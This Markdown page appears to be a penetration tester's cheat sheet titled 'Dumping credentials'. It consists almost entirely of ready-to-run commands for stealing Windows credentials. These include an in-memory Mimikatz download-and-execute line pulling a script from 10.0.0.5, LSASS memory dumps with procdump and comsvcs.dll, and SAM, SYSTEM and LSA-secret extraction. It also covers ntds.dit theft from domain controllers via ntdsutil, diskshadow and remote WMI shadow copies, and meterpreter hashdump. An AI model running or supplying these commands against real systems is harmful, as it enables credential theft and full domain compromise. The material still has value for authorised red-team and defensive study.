---
title: "Dumping credentials"
date: 2020-07-16T13:41:37+02:00
draft: true
---
Jump to:
  * [Local](#local)
  * [Remote](#remote)

## Local
Ways of dumping the lsass.exe process locally
***

#### Using in-memory Mimikatz using PowerShell (Work Out)
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
***

#### LSASS using Task manager
Right click on a the lsass.exe process and select 'Create Dump File'. This will require administrative rights. Hashes can now be dumped using Mimikatz.
```
sekurlsa::minidump <lsass.DMP locations>
sekurlsa::logonpasswords
```
***

#### LSASS using Procdump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```
***

#### LSASS using (native) comsvcs.dll
```
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```
***

#### LSASS using the MiniDumpWriteDump API
Reference: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
***

#### SAM using samdump2
Samdump2 is available for both Windows and Linux (Included in Kali). To decrypt the SAM you'll need the SYSTEM hive. When booted from an external medium you can extract both the SAM and SYSTEM file from 'C:\Windows\System32\Config\'. On Windows you can save it to a file using 'reg save':
```
reg save hklm\system system
reg save hklm\sam sam
```
Now you can use samdump2 to decrypt the SAM.
```
samdump2 system sam
```
***

#### LSA Secrets using Mimikatz
LSA Secrets are stored in the registry ('HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets'). You can directly extract them using Mimikatz.
```
token::elevate
lsadump::secrets
```
Or you can retrieve the SYSTEM- and SECURITY-file and dump the credentials after the fact.
```
reg save HKLM\SYSTEM system
reg save HKLM\security security
```
```
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```
***

#### Cached Domain Credentials using mimikatz
```
lsadump::cache
```
***

#### Hashes directly from a domain controller using ntdsutil (lolbin)
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
The hashes can be dumped offline using secretsdump.py
```
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```
***

#### Hashes using diskshadow
Put the following commands in a .txt file.
```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```
And execute the following commands
```
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```
The ntds.dit will be actracted and placed in the C:\exfil folder. Execute the following commands to perform cleanup.
```
diskshadow.exe
    > delete shadows volume trophy
    > reset
```
***

## Remote
***

#### Cached Domain Credentials using meterpreter
The 'hashdump' command in meterpreter will dump the local SAM account hashes.
```
hashdump
```
To dump cached domain credentials in the mscach format the 'cachedump' module can be used.
```
getsystem
use post/windows/gather/cachedump
run
```
The output will be in the 'mscache'-format.
***

#### Cached Domain Credentials using secretsdump

Obtain the SAM, SECURITY and SYSTEM hive. Either trough booting from an external medium or using reg.exe.
```
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

After obtaining the hashes can be dumped using secretsdump from impacket.
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
***

#### Domain controller hashes shadow copy over WMI

Creat a shadow copy of the C drive.
```powershell
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```
Copy the ntds.dit, SYSTEM and SECURITY hives to C:\temp on the remote machine
```powershell
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```
Mount the remote C:\temp directoy to your local machine
```
net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
```
Now you can run secretsdump to dump the hashes (as shown in previous examples)